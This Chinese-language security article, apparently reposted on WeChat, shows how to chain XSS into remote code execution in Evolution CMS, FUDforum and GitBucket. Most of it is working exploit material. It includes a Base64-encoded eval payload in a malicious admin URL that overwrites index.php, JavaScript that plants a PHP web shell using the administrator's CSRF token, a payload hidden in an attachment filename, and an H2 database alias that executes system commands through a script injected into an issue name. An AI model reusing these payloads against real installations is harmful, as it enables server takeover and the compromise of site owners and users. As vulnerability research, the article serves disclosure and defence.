#  开源应用程序导致 XSS 到 RCE 漏洞缺陷   
 Ots安全   2024-02-25 17:09  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
跨站脚本 (XSS) 是 Web 应用程序中最常见的攻击之一。如果攻击者可以将 JavaScript 代码注入应用程序输出中，这不仅会导致 cookie 盗窃、重定向或网络钓鱼，而且在某些情况下还会导致系统完全受损。  
  
  
在本文中，我将展示如何在 Evolution CMS、FUDForum 和 GitBucket 的示例上通过 XSS 实现远程代码执行。  
  
  
**Evolution CMS v3.1.8**  
  
链接：https: //github.com/evolution-cms/evolution  
  
CVE：待定  
  
  
Evolution CMS 是世界上最快且可定制性最强的开源 PHP CMS。  
在 Evolution CMS 中，我发现用户控制数据的未转义显示，这导致了反射型 XSS 攻击的可  
能性：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjx2eH2cenMtZeGmhlnWM15tqn8JnzTzGWqN8ActQR0z80cuCNrtmUcQ/640?wx_fmt=png&from=appmsg "")  
  
manager/views/page/user_roles/permission.blade.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjN1gJkCoI6rAqXnKY0167N3MPPTF3WuNCicicicWh1GQ7OO7ibibpsJh6Afg/640?wx_fmt=png&from=appmsg "")  
  
manager/views/page/user_roles/user_role.blade.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjZM0hjtwYicZGHpw2Gy17bC6hZqade36yib5U35I3zmmxicJCv2qo3hKIg/640?wx_fmt=png&from=appmsg "")  
  
manager/views/page/user_roles/permissions_groups.blade.php  
  
我将给出一个带有有效负载的链接的示例。  
```
https://192.168.1.76/manager/?a=35&id=1%22%3E%3Cimg%20src=1%20onerror=alert(document.domain)%3E
```  
  
如果系统中授权的管理员点击该链接或点击该链接，则 javascript 代码将在管理员的浏览器中执行：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjJkkiaSm2JZluGRWvJuN6R7VTmPNOUpb29ttAVMRRibwFhvayeKib6MHaA/640?wx_fmt=png&from=appmsg "")  
  
EEvolution CMS中反射型XSS攻击的利用  
  
  
在 Evolution CMS 管理面板的文件管理器部分中，管理员可以上传文件。问题是它无法上传 php 文件，但是它可以编辑现有的文件。  
  
  
我们将给出一个示例 javascript 代码，它将使用 phpinfo() 函数覆盖 ndex.php 文件：  
```
$.get('/manager/?a=31',function(d) {
  let p = $(d).contents().find('input[name=\"path\"]').val();
  $.ajax({
    url:'/manager/index.php',
    type:'POST',
    contentType:'application/x-www-form-urlencoded',
    data:'a=31&mode=save&path='+p+'/index.php&content=<?php phpinfo(); ?>'}
  );
});
```  
  
是时候将有效负载和上述 JavaScript 代码结合起来了，例如，可以用 Base64 进行编码：  
```
https://192.168.1.76/manager/?a=35&id=1%22%3E%3Cimg%20src=1%20onerror=eval(atob(%27JC5nZXQoJy9tYW5hZ2VyLz9hPTMxJyxmdW5jdGlvbihkKXtsZXQgcCA9ICQoZCkuY29udGVudHMoKS5maW5kKCdpbnB1dFtuYW1lPSJwYXRoIl0nKS52YWwoKTskLmFqYXgoe3VybDonL21hbmFnZXIvaW5kZXgucGhwJyx0eXBlOidQT1NUJyxjb250ZW50VHlwZTonYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyxkYXRhOidhPTMxJm1vZGU9c2F2ZSZwYXRoPScrcCsnL2luZGV4LnBocCZjb250ZW50PTw/cGhwIHBocGluZm8oKTsgPz4nfSk7fSk7%27))%3E
```  
  
如果对系统中授权的管理员进行成功攻击，index.php 文件将被攻击者放置在有效负载中的代码覆盖。在本例中，这是对 phpinfo() 函数的调用：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjqMqw8lqPfgttkucMEyFrRiaIXdQvxfZSEZiciaM3HFuvBmZvfxOZQERUw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**FUDforum v3.1.1**  
  
Link: https://github.com/fudforum/FUDforum  
  
CVE: 待定  
  
  
FUDforum 是一个超快速且可扩展的讨论论坛。它是高度可定制的，支持无限的成员、论坛、帖子、主题、投票和附件。  
  
  
在 FUDforum 中，我发现私人消息或论坛主题中的附件名称中存在用户控制数据的未转义显示，这允许执行存储的 XSS 攻击。附加并上传名为 <img src=1 onerror=alert()>.png 的文件。下载该文件后，javascript代码将在浏览器中执行：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpj3HfnWTicTdcJic0AIDsORG4hSc46yopFmMGl46oy9wPEC2ZqgIa65Mpw/640?wx_fmt=png&from=appmsg "")  
  
FUDforum 管理面板有一个文件管理器，允许您将文件上传到服务器，包括带有 php 扩展名的文件。  
  
  
攻击者可以利用存储的XSS上传可以执行服务器上任何命令的php文件。  
  
  
FUDforum已经存在一个公开漏洞，它使用 JavaScript 代码代表管理员上传一个 php 文件：  
```
const action = '/adm/admbrowse.php';

function uploadShellWithCSRFToken(csrf) {
  let cur = '/var/www/html/fudforum.loc';
  let boundary = "-----------------------------347796892242263418523552968210";
  let contentType = "application/x-php";
  let fileName = 'shell.php';
  let fileData = "<?=`$_GET[cmd]`?>";
  let xhr = new XMLHttpRequest();
  xhr.open('POST', action, true);
  xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary=" + boundary);
  let body = "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="cur"\r\n\r\n';
  body += cur + "\r\n";
  body += "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="SQ"\r\n\r\n';
  body += csrf + "\r\n";
  body += "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="fname"; filename="' + fileName + '"\r\n';
  body += "Content-Type: " + contentType + "\r\n\r\n";
  body += fileData + "\r\n\r\n";
  body += "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="tmp_f_val"\r\n\r\n';
  body += "1" + "\r\n";
  body += "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="d_name"\r\n\r\n';
  body += fileName + "\r\n";
  body += "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="file_upload"\r\n\r\n';
  body += "Upload File" + '\r\n';
  body += "--" + boundary + "--";
  xhr.send(body);
}
let req = new XMLHttpRequest();
req.onreadystatechange = function() {
  if (req.readyState == 4 && req.status == 200) {
    let response = req.response;
    uploadShellWithCSRFToken(response.querySelector('input[name=SQ]').value);
  }
}
req.open("GET", action, true);
req.responseType = "document";
req.send();
```  
  
现在，攻击者可以给自己写一条私人消息，并将上述漏洞附加为文件。消息发送给自身后，需要获取服务器上托管 javascript 漏洞的路径：  
```
index.php?t=getfile&id=7&private=1
```  
  
下一步是准备将通过存储的 XSS 攻击执行的 JavaScript 有效负载。有效负载的本质是获取早期放置的漏洞并运行它：  
```
$.get('index.php?t=getfile&id=7&&private=1',function(d){eval(d)})
```  
  
仍然需要将所有内容放在一起以形成私人消息中附件的全名。我们将用 Base64 对组装的 JavaScript 有效负载进行编码：  
```
<img src=1 onerror=eval(atob('JC5nZXQoJ2luZGV4LnBocD90PWdldGZpbGUmaWQ9NyYmcHJpdmF0ZT0xJyxmdW5jdGlvbihkKXtldmFsKGQpfSk='))>.png
```  
  
管理员读取攻击者发送的带有附件的私信后，会代表管理员在服务器上创建一个名为shell.php的文件，该文件将允许攻击者在服务器上执行任意命令：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjGHiajqhoZKeELS0AiaA2s0dynygUgOWosp5icTZwEKGqII7HKWWVqWIqA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**GitBucket v4.37.1**  
  
链接：https: //github.com/gitbucket/gitbucket  
  
  
GitBucket 是一个由 Scala 提供支持的 Git 平台，具有易于安装、高扩展性和 GitHub API 兼容性。  
  
  
在GitBucket中，我发现主页和攻击者的个人资料页面（/hacker?tab=activity）上未转义显示用户控制的问题名称，这导致了存储的XSS：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjmF9lqjVtRcLN9CT8qDYq12Y338DRSricD25oh4DjicIbIXxNnSxZuqGw/640?wx_fmt=png&from=appmsg "")  
  
进行存储的 XSS 攻击，并尝试利用它在服务器上执行代码。管理面板具有用于执行 SQL 查询的工具 - 数据库查看器。  
  
  
GitBucket默认使用H2 数据库引擎。该数据库有一个公开可用的漏洞来实现远程代码执行。  
  
  
因此，攻击者所需要做的就是根据此漏洞创建一个 PoC 代码，将其上传到存储库并在攻击期间使用它：  
```
var url = "/admin/dbviewer/_query";
$.post(url, {query: 'CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A");return s.hasNext() ? s.next() : ""; }$$;'
})
.done(function(data) {$.post(url, {query: "CALL EXECVE('touch HACKED')"})})
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjr7Ymqia6AIEPicsODoHZhUNzfNB7SSpj4JCBlaK3LY3NSVWWJIu6e0WQ/640?wx_fmt=png&from=appmsg "")  
  
现在仍然需要创建一个新问题或重命名旧问题，并在加载早期漏洞的情况下执行存储的 XSS 攻击：  
```
Issue 1"><script src="/hacker/Repo1/raw/f85ebe5d6b979ca69411fa84749edead3eec8de0/exploit.js"></script>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjwMiax6MVVxwbeiaElGcykiaQxwe8jHUAm8HmlEf5NpSvia3NC7yn8V4K4g/640?wx_fmt=png&from=appmsg "")  
  
当管理员访问攻击者的个人资料页面或主页时，将代表他执行漏洞利用，并在服务器上创建 HACKED 文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjXKibibeo2uEE1dHhqURamtxQJRlwUKibrfjDlRu068Ztia5l7wWZh5Z7GQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadPsVWgiaucDh2zg6oyiaVSpjlT8pectyBgkGEXB2qzwHlXcWQBJHEhytjg6IWtFJQOGLyxkTeVVC4A/640?wx_fmt=png&from=appmsg "")  
  
**结论**  
  
我们已经证明，低技能的攻击者可以通过多个开源应用程序中的任何 XSS 攻击轻松实现远程代码执行。  
  
  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
